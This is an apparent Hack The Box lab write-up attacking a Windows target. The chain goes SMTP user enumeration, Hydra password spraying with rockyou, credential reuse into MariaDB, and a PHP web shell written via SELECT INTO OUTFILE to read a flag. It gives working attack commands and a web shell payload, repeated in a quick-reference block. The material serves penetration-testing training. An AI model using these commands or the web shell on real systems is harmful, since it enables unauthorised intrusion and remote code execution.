# Attacking Common Services — Skill Assessment Walkthrough (Easy)

**Source:** HTB write-up — SMTP user enum → password spray → MariaDB FILE privilege → webshell → flag

---

## Scenario

- Engagement for "InlaneFreight" — pentest of 3 hosts.
- Target 1: a server handling **email, customer data, and file storage**.
- Goal: find a proof-of-access flag (`HTB{...}`) on each host.

---

## Step 1 — Recon

```bash
nmap -sC -sV -Pn 10.129.203.7
```

**Services found:**

| Port | Service |
|---|---|
| 21/tcp | FTP (Core FTP) |
| 25, 587 | SMTP (hMailServer) |
| 80 | HTTP (XAMPP dashboard) |
| 443 | HTTPS (Core FTP HTTPS) |
| 3306 | MariaDB 10.4.24 |
| 3389 | RDP |

---

## Step 2 — SMTP User Enumeration

```bash
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7
```

- **Result:** `fiona@inlanefreight.htb` confirmed to exist.

---

## Step 3 — Password Attack (Hydra)

**Initial attempt (failed)** — module-supplied wordlist:

```bash
hydra -l fiona@inlanefreight.htb -P pws.list -f 10.129.203.7 smtp
```

- No hits — the bundled `pws.list` didn't contain the working password.

**Successful attempt** — switched to **rockyou.txt**:

```bash
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -f 10.129.197.248 smtp
```

- **Credential found:** `fiona@inlanefreight.htb : 987654321`

**Lesson:** when a small/bundled wordlist fails, escalate to a larger list (e.g., rockyou) before concluding a target isn't vulnerable to password attacks.

---

## Step 4 — Login to MariaDB

```bash
mysql -u fiona -p987654321 -h 10.129.197.248 --ssl=0
```

- `--ssl=0` needed — server didn't support client SSL, caused connection errors without this flag.
- Credential reuse worked: SMTP creds also valid for MariaDB.

---

## Step 5 — Check `secure_file_priv`

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

- Returned **empty** → **no restriction** on file writes via MySQL/MariaDB (this variable, when set to a path or `NULL`, normally restricts where `INTO OUTFILE`/`LOAD_FILE` can read/write).

---

## Step 6 — Write a Web Shell via `INTO OUTFILE`

- Found `pageinfo.php` on the port-80 web app, revealing the web root path: `C:/xampp/htdocs/dashboard/`.
- Confirmed the compromised DB account had the **FILE privilege**.

```sql
SELECT "<?=`$_GET[0]`?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/phpinfo3.php';
```

- Minimal PHP web shell: `<?=`$_GET[0]`?>` — executes the value of GET parameter `0` as a shell command (backtick execution).

**Confirm file write:**

```sql
SELECT LOAD_FILE('C:/xampp/htdocs/dashboard/phpinfo3.php');
```

---

## Step 7 — Use the Web Shell to Retrieve the Flag

```
http://10.129.197.248/dashboard/phpinfo3.php?0=type+C:\Users\Administrator\Desktop\flag.txt
```

- GET parameter `0` = `type C:\Users\Administrator\Desktop\flag.txt` → executes via the webshell → flag returned in the HTTP response.

---

## Full Command Sequence (Quick Reference)

```bash
nmap -sC -sV -Pn 10.129.203.7
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7

# Password attack
hydra -l fiona@inlanefreight.htb -P pws.list -f 10.129.203.7 smtp                              # failed
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -f 10.129.197.248 smtp     # success

# DB access
mysql -u fiona -p987654321 -h 10.129.197.248 --ssl=0
```
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT "<?=`$_GET[0]`?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/phpinfo3.php';
SELECT LOAD_FILE('C:/xampp/htdocs/dashboard/phpinfo3.php');
```
```
http://10.129.197.248/dashboard/phpinfo3.php?0=type+C:\Users\Administrator\Desktop\flag.txt
```

## Full Attack Chain Summary

1. **Nmap recon** → identifies FTP, SMTP, HTTP, MariaDB, RDP.
2. **SMTP user enumeration** (`smtp-user-enum`, RCPT mode) → valid username `fiona`.
3. **Password brute-force** (Hydra against SMTP) → bundled wordlist fails, **rockyou.txt** succeeds → `fiona:987654321`.
4. **Credential reuse** → same creds work for MariaDB.
5. **`secure_file_priv` empty** → confirms unrestricted file read/write via SQL.
6. **`FILE` privilege + known web root** → write a PHP web shell directly via `SELECT ... INTO OUTFILE`.
7. **Web shell command execution** → read `flag.txt` via a GET parameter.

---

## Key Takeaways

- **SMTP enumeration** (`VRFY`/`EXPN`/`RCPT`) is a reliable way to harvest valid usernames before a password attack.
- Don't give up on password attacks after one wordlist — **escalate to larger lists** (rockyou) if the engagement scope allows.
- **Credential reuse across services** (SMTP → DB) is common in real environments — always retest discovered creds broadly.
- MySQL/MariaDB's **`FILE` privilege** combined with an **empty `secure_file_priv`** and a **known, writable web root** is a direct path to remote code execution via `SELECT ... INTO OUTFILE`.
- A minimal one-liner PHP web shell (`<?=`$_GET[0]`?>`) is enough to achieve command execution once a file can be dropped into a web-accessible directory.
